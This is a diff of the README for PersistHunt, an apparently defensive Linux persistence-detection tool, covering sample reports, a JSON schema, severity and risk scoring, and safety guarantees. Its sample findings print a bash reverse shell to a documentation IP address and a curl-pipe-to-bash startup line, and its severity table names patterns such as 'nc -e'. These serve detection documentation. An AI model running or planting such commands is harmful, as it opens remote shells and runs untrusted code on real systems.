-#### Stable JSON Schema
-
-```json
-{
-  "tool": "PersistHunt",
-  "version": "0.1.0",
-  "timestamp": "2026-09-08T07:31:12.331573+00:00",
-  "host": "linux-prod-node-01",
-  "risk_score": 6.6,
-  "statistics": {
-    "total_findings": 8,
-    "highest_severity": "CRITICAL",
-    "severity_counts": {
-      "CRITICAL": 1,
-      "HIGH": 2,
-      "MEDIUM": 3,
-      "LOW": 2,
-      "INFO": 0
-    },
-    "category_counts": {
-      "account": 1,
-      "process": 1,
-      "shell": 1,
-      "cron": 3,
-      "systemd": 2
-    },
-    "raw_score": 33.0
-  },
-  "findings": [
-    {
-      "id": "PH-ACCT-001",
-      "category": "account",
-      "severity": "CRITICAL",
-      "title": "Non-root user account with UID 0 (root privileges)",
-      "description": "Account 'toor' possesses UID 0.",
-      "evidence": "Username: toor, UID: 0",
-      "location": "/etc/passwd:toor",
-      "recommendation": "Remove unauthorized UID 0 accounts immediately."
-    }
-  ]
-}
-```
-
-#### Terminal Summary Format
+### Terminal Summary Output
 
 ```text
 PersistHunt
@@ -519,172 +207,190 @@ Linux Persistence Detection Framework
 
 Scan complete.
 
-Findings: 8
+Findings: 2
 
-CRITICAL: 1
 HIGH: 2
-MEDIUM: 3
-LOW: 2
 
-Risk Score: 7.2/10
+Risk Score: 2.4/10
 
 === Finding Summaries ===
 
-1. [CRITICAL] PH-ACCT-001 - Non-root user account with UID 0 (root privileges)
-   Location: /etc/passwd:toor
-   Evidence: Username: toor, UID: 0
-   Action: Remove unauthorized UID 0 accounts immediately.
-...
-```
+1. [HIGH] PH-CRON-001 - Interactive network utility or raw socket redirection
+   Location: /etc/cron.d/sync_job:3
+   Evidence: /bin/bash -i >& /dev/tcp/198.51.100.1/4444 0>&1
+   Action: Investigate network connections and remove unauthorized cron jobs.
 
-#### Usage Example
+2. [HIGH] PH-SHELL-002 - Remote download piped directly into shell in startup script
+   Location: /home/audit_user/.bashrc:42
+   Evidence: curl -fsSL https://updates.example.org/patch.sh | bash
+   Action: Audit startup script remote sources and verify script integrity.
 
-```python
-from persisthunt import (
-    CronDetector,
-    SystemdDetector,
-    SSHDetector,
-    ShellDetector,
-    SuidDetector,
-    ProcessDetector,
-    AccountDetector,
-    generate_report,
-)
-
-# 1. Run detectors
-findings = CronDetector().scan()
-findings.extend(SystemdDetector().scan())
-findings.extend(SSHDetector().scan())
-findings.extend(ShellDetector().scan())
-findings.extend(SuidDetector().scan())
-findings.extend(ProcessDetector().scan())
-findings.extend(AccountDetector().scan())
-
-# 2. Generate report
-report = generate_report(findings, host="web-node-01")
-
-# 3. Print terminal output
-print(report.to_terminal())
-
-# 4. Save JSON and HTML reports
-report.save_json("audit_report.json")
-report.save_html("audit_report.html")
+=== Detector Status ===
+- cron: SUCCESSFUL (1 findings)
+- shell: SUCCESSFUL (1 findings)
 ```
 
 ---
 
-### Stage 10: Command-Line Interface (CLI)
+## JSON Output
 
-Stage 10 introduces the production command-line interface for PersistHunt (`persisthunt` / `python -m persisthunt`).
+PersistHunt produces a deterministic, stable JSON schema:
 
-#### CLI Commands
+```json
+{
+  "tool": "PersistHunt",
+  "version": "0.1.0",
+  "timestamp": "2026-09-08T12:00:00.000000+00:00",
+  "host": "linux-audit-node-01",
+  "risk_score": 6.0,
+  "statistics": {
+    "total_findings": 1,
+    "highest_severity": "HIGH",
+    "severity_counts": {
+      "CRITICAL": 0,
+      "HIGH": 1,
+      "MEDIUM": 0,
+      "LOW": 0,
+      "INFO": 0
+    },
+    "category_counts": {
+      "cron": 1
+    },
+    "raw_score": 6.0,
+    "detector_status": {
+      "cron": "successful"
+    }
+  },
+  "detector_status": {
+    "cron": {
+      "status": "successful",
+      "findings_count": 1,
+      "error": null
+    }
+  },
+  "findings": [
+    {
+      "id": "PH-CRON-001",
+      "category": "cron",
+      "severity": "HIGH",
+      "title": "Interactive network utility or raw socket redirection in cron entry",
+      "description": "Command references /dev/tcp socket paths commonly associated with reverse shell communication.",
+      "evidence": "/bin/bash -i >& /dev/tcp/198.51.100.1/4444 0>&1",
+      "location": "/etc/cron.d/sync_job:3",
+      "recommendation": "Investigate active network connections immediately and terminate unauthorized cron jobs."
+    }
+  ]
+}
+```
 
-| Command | Description |
-|---|---|
-| `persisthunt scan` | Run full system audit across all detectors and print terminal summary |
-| `persisthunt scan --json` | Output scan results in machine-readable JSON format |
-| `persisthunt scan --category cron` | Audit only cron persistence |
-| `persisthunt scan -c cron,systemd,ssh` | Audit multiple comma-separated categories |
-| `persisthunt scan --severity high` | Filter findings to only HIGH and CRITICAL severities |
-| `persisthunt scan -o report.json` | Save scan report to JSON file |
-| `persisthunt scan -o report.html` | Save scan report to self-contained HTML file |
-| `persisthunt scan --exit-zero` | Return exit code 0 even if HIGH or CRITICAL threats are found |
-| `persisthunt version` / `persisthunt -V` | Display PersistHunt version |
-| `persisthunt --help` / `persisthunt scan --help` | Show command documentation and options |
+---
 
-#### Command-Line Options (`persisthunt scan`)
+## Severity Model
 
-| Flag | Description |
-|---|---|
-| `--json` | Output scan results in machine-readable JSON to `stdout` |
-| `-c`, `--category` | Filter detector execution by category (`cron`, `systemd`, `ssh`, `shell`, `suid`, `process`, `account`, or `all`). Can be repeated or comma-separated. |
-| `-s`, `--severity` | Minimum severity threshold filter (`info`, `low`, `medium`, `high`, `critical`) |
-| `-o`, `--output` | Save report to specified file path (`.json` or `.html` extension) |
-| `-q`, `--quiet` | Suppress scan progress messages on `stderr` |
-| `--exit-zero` | Enforce exit code 0 regardless of threats detected (useful for non-blocking CI) |
-| `--root-prefix` | Target filesystem root prefix for offline container, disk image, or forensic mount inspection |
-
-#### Exit Codes
-
-| Code | Constant | Meaning |
+| Severity | Description | Criteria & Examples |
 |---|---|---|
-| `0` | `EXIT_SUCCESS` | Scan completed successfully with no HIGH or CRITICAL threats detected (or `--exit-zero` used). |
-| `1` | `EXIT_ERROR` | Operational error (e.g. invalid arguments or bad category name). |
-| `2` | `EXIT_THREAT_DETECTED` | Scan completed and detected one or more HIGH or CRITICAL persistence threats. |
+| **CRITICAL** | Confirmed critical vulnerability or elevated backdoor | Non-root UID 0 accounts, empty passwords in `/etc/shadow`, world-writable SUID binaries. |
+| **HIGH** | Strong indicator of active persistence or command execution | Reverse shells (`/dev/tcp`, `nc -e`), download-pipe-to-shell (`curl \| sh`), shell alias hijacking (`sudo`), running deleted binaries. |
+| **MEDIUM** | Suspicious configuration requiring operator review | Inline interpreter commands (`python -c`), execution from `/tmp`, non-standard SUID binaries, `PermitRootLogin yes`. |
+| **LOW** | Configuration anomaly or hygiene issue | Broken symlinks in cron/systemd dirs, system services executing from home directories, recently added accounts. |
+| **INFO** | Diagnostic notice or system baseline | Permission denied on unreadable files, standard system SUID inventory (`/usr/bin/passwd`). |
 
-#### Stream Separation & Scripting
+---
 
-The CLI cleanly separates progress indicators and diagnostic messages from structured output:
-- **`stderr`**: Progress updates (e.g. `[+] Scanning cron persistence...`) and operational error warnings.
-- **`stdout`**: Scan reports (Terminal summary or JSON).
+## Risk Scoring
 
-This guarantees that standard Unix piping works seamlessly without corrupting stdout streams:
+PersistHunt uses a deterministic, explainable mathematical aggregation formula rather than naive averaging:
+
+### Severity Weights
+
+$$\text{CRITICAL} = 10.0 \quad\mid\quad \text{HIGH} = 6.0 \quad\mid\quad \text{MEDIUM} = 3.0 \quad\mid\quad \text{LOW} = 1.0 \quad\mid\quad \text{INFO} = 0.0$$
+
+### Mathematical Formulation
+
+$$\text{Raw Score} = \sum_{f \in \text{findings}} \text{Weight}(f.\text{severity})$$
+
+$$\text{Risk Score} = \min\left(10.0, \text{round}\left(\frac{\text{Raw Score}}{5.0}, 1\right)\right)$$
+
+### Properties
+
+- **Never Diluted**: Adding benign or informational findings never lowers the risk score.
+- **Bounded**: The risk score scales smoothly between `0.0` and `10.0`.
+- **Explainable**: The contributing weights and top findings are directly accessible via `report.explain()`.
+
+---
+
+## Security Model
+
+PersistHunt is built for high-security environments:
+
+1. **Read-Only Operation**: PersistHunt never executes discovered binaries or scripts. No modifications to files, services, accounts, or permissions are ever made.
+2. **Offline Safety**: Zero network connections are made. No telemetry, credentials, or findings are transmitted externally.
+3. **Secret Shielding**: Password hashes in `/etc/shadow` are never displayed or exported. SSH private key headers and command-line authorization tokens are automatically sanitized.
+4. **Special File Protection**: File readers check `stat.S_ISREG` before opening, preventing hangs on named pipes (`mkfifo`) or device nodes.
+5. **Memory & Resource Caps**: Enforces a 10 MB maximum file size limit on configuration files and bounded SUID directory traversal (`max_depth = 15`) with cycle detection.
+
+---
+
+## Limitations
+
+- **Privilege Scope**: An unprivileged user audit cannot read `/etc/shadow` or other users' `/home` directories. Full system audits require root privileges.
+- **Kernel-Level Persistence**: Rootkits operating entirely within the Linux kernel (e.g. malicious kernel modules or direct kernel object manipulation) cannot be detected by userland file auditing.
+- **Transient Memory Payloads**: In-memory only payloads that do not touch disk or register persistence hooks will not be captured after process termination.
+
+---
+
+## Testing
+
+PersistHunt maintains a comprehensive automated test suite with 180+ tests:
 
 ```bash
-# Pipe pure JSON directly to jq
-persisthunt scan --json -q | jq '.findings[] | select(.severity == "CRITICAL")'
+# Run complete test suite
+pytest -v
 
-# Run in CI/CD pipeline and block builds on threats
-persisthunt scan --severity high
-if [ $? -eq 2 ]; then
-    echo "High-severity persistence threats detected! Failing build."
-    exit 1
-fi
+# Run the end-to-end 11-stage demonstration script
+python3 demo.py
 ```
 
 ---
 
-### Stage 11: Security Testing and Hardening
+## Architecture
 
-Stage 11 enforces comprehensive security, reliability, safety verification, detector isolation, and resource protection across the framework.
-
-#### Safety Guarantees
-
-PersistHunt adheres to strict read-only and non-interfering operational rules:
-
-1. **Zero Command Execution**: PersistHunt never executes discovered commands, scripts, binaries, or suspicious payloads (`subprocess`, `os.system`, `os.popen`, `exec`, and `eval` are never invoked on inspected artifacts).
-2. **Zero Filesystem or State Modifications**: PersistHunt never alters permissions (`chmod`), ownership (`chown`), persistence configurations, accounts, passwords, or systemd services. Discovered files are never deleted or modified.
-3. **Zero External Network Transmissions**: PersistHunt never initiates outbound network connections or transmits telemetry/credentials. All scans are purely local and offline-safe.
-4. **Secret & Credential Masking**: Password hashes (`/etc/shadow`), private SSH keys, and command-line authorization tokens are automatically sanitized or redacted before being recorded in findings.
-
-#### Detector Isolation & Fault Tolerance
-
-Detectors run with process-level isolation in the audit engine. A fatal exception or unhandled crash in one detector will never abort the remaining audit:
-
-- Individual detector outcomes are tracked and reported in terminal summaries, JSON reports, and HTML badges:
-  - **`successful`**: Detector executed completely without unhandled errors or permission restrictions.
-  - **`permission-limited`**: Detector encountered permission barriers on one or more inspection paths (e.g. unprivileged user inspecting `/root/.ssh` or `/etc/shadow`), recording non-fatal diagnostic findings (`PH-*-090`).
-  - **`failed`**: Detector experienced an unexpected runtime failure. The error is safely caught and logged without compromising the broader scan.
-
-#### Filesystem & Resource Hardening
-
-- **Special File / FIFO Protection**: Configuration readers verify `stat.S_ISREG` before opening files, preventing hangs or deadlocks caused by named pipes (`mkfifo`), character devices, or UNIX domain sockets placed in persistence paths.
-- **Huge File & DoS Prevention**: Enforces a strict 10 MB maximum file size ceiling on configuration and startup scripts (`safe_read_lines`, `safe_read_text`), preventing memory exhaustion or denial-of-service attacks.
-- **Circular Symlink & Traversal Bounds**: The SUID/SGID traversal engine enforces cycle detection using `(st_dev, st_ino)` tracking and a maximum recursion depth of 15, preventing infinite loops or runaway filesystem traversal.
-- **Untrusted Character Handling**: Unicode filenames with emojis, non-ASCII characters, null bytes, and control characters are normalized with `errors="replace"` and serialized safely in JSON reports.
-
-#### Safety Limitations
-
-While PersistHunt provides extensive persistence detection, operators should understand the following boundaries:
-
-- **Privilege Boundaries**: Unprivileged scans (`non-root`) cannot audit restricted files such as `/etc/shadow`, `/root/.ssh`, or user crontabs belonging to other accounts. For complete system visibility, run PersistHunt with root privileges.
-- **Kernel-Level Persistence**: PersistHunt audits userland configurations, filesystem structures, and process trees. Kernel-level persistence (such as direct kernel memory tampering or malicious loadable kernel modules) requires dedicated kernel integrity or eBPF tooling.
-- **Forensic Environment**: For offline container or disk image analysis, use the `--root-prefix` parameter to target mounted forensic images without risking interaction with the live host.
+```text
+persisthunt/
+├── __init__.py           # Package exports & version
+├── __main__.py           # python -m persisthunt entrypoint
+├── cli.py                # Command-line interface & argument parser
+├── findings.py           # Finding model, FindingCollection & Severity enum
+├── reporting.py          # ScanReport engine (Terminal, JSON, HTML)
+├── risk.py               # Deterministic risk-scoring engine
+└── detectors/
+    ├── base.py           # BaseDetector abstract interface & safe file helpers
+    ├── cron.py           # Cron persistence detector
+    ├── systemd.py        # Systemd unit persistence detector
+    ├── ssh.py            # SSH authorized_keys & daemon detector
+    ├── shell.py          # Shell initialization script detector
+    ├── suid.py           # SUID/SGID binary auditor
+    ├── process.py        # Active process runtime detector
+    └── account.py        # Local account & password aging detector
+```
 
 ---
 
-## Running Tests
+## Roadmap
 
-Run the full test suite using `pytest`:
+- [ ] **Wazuh Agent Integration**: Native decoders and rules for PersistHunt JSON alerts.
+- [ ] **eBPF System Call Auditing**: Real-time event detection for runtime persistence installation.
+- [ ] **systemd Timer Frequency Analysis**: Automated detection of high-frequency stealth timers.
+- [ ] **Auditd Rule Generation**: Exporting proactive auditd rules matching discovered persistence mechanisms.
 
-```bash
-pytest
-```
+---
 
-Run the demonstration script:
+## License
 
-```bash
-python demo.py
-```
+This project is licensed under the terms of the [MIT License](LICENSE).
 
+---
 
+## Disclaimer
+
+PersistHunt is intended for authorized security auditing, defensive persistence hunting, and vulnerability assessment. Never use this tool against systems for which you do not possess explicit authorization.
